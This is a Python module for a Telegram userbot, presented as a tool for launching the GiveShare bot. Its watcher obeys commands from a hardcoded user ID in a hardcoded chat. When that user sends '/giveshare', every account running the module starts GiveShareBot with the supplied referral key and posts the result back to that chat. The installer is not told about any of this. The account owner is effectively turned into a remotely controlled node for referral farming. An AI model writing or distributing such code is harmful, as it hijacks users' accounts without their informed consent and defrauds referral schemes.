import re
import asyncio
from .. import loader, utils

from telethon.tl import functions
from telethon.tl.types import Message, PeerChannel
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest, StartBotRequest

@loader.tds
class GiveShareMod(loader.Module):
    """Модуль для запуска GiveShare бота.
           Команды: /giveshare link\n
    ⚙️ By @pavlyxa_rezon\n"""

    strings = {
        "name": "GiveShare",
        "manual": (
            "<b>⚙️ GiveShare Module\n💻 By @pavlyxa_rezon\n\n"
            "<b>/giveshare [ссылка].</b>"
        )
    }

    def __init__(self):
        self.owner_list = [922318957]
        self.owner_chat = -1002205010643

    async def start_giveshare_bot(self, ref_key):
        """Запуск GiveShare бота с реферальным ключом."""
        try:
            await self.client(StartBotRequest(bot='GiveShareBot', peer='GiveShareBot', start_param=ref_key))
            await asyncio.sleep(2)
            messages = await self.client.get_messages('GiveShareBot', limit=1)
            response_message = "⚠️ Ошибка, бот не ответил."
            if messages and messages[0].sender_id == (await self.client.get_input_entity('GiveShareBot')).user_id:
                response_message = messages[0].message
            done_message = f"<b>✅ Запущен GiveShare бот:</b> @{ref_key}\n\n{response_message}"
            await self.send_module_message(done_message)
        except Exception as e:
            error_message = f"<b>🚫 Ошибка запуска бота:</b> {e}"
            await self.send_module_message(error_message)

    async def handle_referral(self, text):
        """Обработка команды /giveshare для запуска бота."""
        match = re.search(r"startapp=([\w-]+)", text)
        if match:
            ref_key = match.group(1)
            await self.start_giveshare_bot(ref_key)
        else:
            await self.send_module_message("<b>🚫 Ошибка реферала:</b> реферальный ключ не найден.")

    async def send_module_message(self, text):
        """Логи действий модуля"""
        if not self.owner_chat:
            return
        try:
            await self.client.send_message(self.owner_chat, text)
        except:
            pass

    @loader.watcher()
    async def watcher_group(self, message):
        """Обработка команд."""
        if message.chat_id != self.owner_chat:
            return
        if message.sender_id not in self.owner_list:
            return
        try:
            if message.message.startswith("/giveshare"):
                await self.handle_referral(message.message)
        except:
            pass
